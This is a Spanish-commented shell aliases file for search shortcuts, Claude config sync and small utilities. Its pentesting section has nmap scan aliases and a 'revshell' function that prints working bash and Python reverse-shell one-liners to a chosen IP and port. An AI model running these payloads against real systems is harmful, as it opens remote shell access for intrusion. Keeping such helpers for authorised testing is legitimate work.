# Claude Code - Aliases Minimalistas

# ============================================
# Búsqueda Web (SearXNG)
# ============================================
alias s='searxng-search'           # Búsqueda web: s "query"

# Búsquedas especializadas por motor
alias cve='s "!exploit-db"'        # Buscar CVEs/exploits
alias gh='s "!gh"'                 # Buscar en GitHub
alias so='s "!so"'                 # Stack Overflow
alias aw='s "!aw"'                 # Arch Wiki
alias w='s "!wp"'                  # Wikipedia
alias ddg='s "!ddg"'               # DuckDuckGo
alias go='s "!go"'                 # Google

# ============================================
# Claude Management
# ============================================
alias cs='claude-backup sync'      # Sync config a git
alias cc='claude-check'            # Verificar setup

# ============================================
# SearXNG Control
# ============================================
alias xs='systemctl --user start searxng.service'
alias xr='systemctl --user restart searxng.service'
alias xl='docker logs -f searxng'

# ============================================
# Security (para hacking/pentesting)
# ============================================
alias nq='sudo nmap -sV -sC'       # Quick nmap scan: nq 192.168.1.1
alias ps='sudo nmap -p- --min-rate=1000 -T4'  # Full port scan

# Reverse shell generator
revshell() {
    local ip="${1:-127.0.0.1}" port="${2:-4444}"
    echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
}

# ============================================
# Quick Utils
# ============================================
alias j='jq .'                     # Pretty print JSON
alias b64='base64'                 # Encode base64
alias b64d='base64 -d'             # Decode base64
alias serve='python -m http.server 8000'  # HTTP server
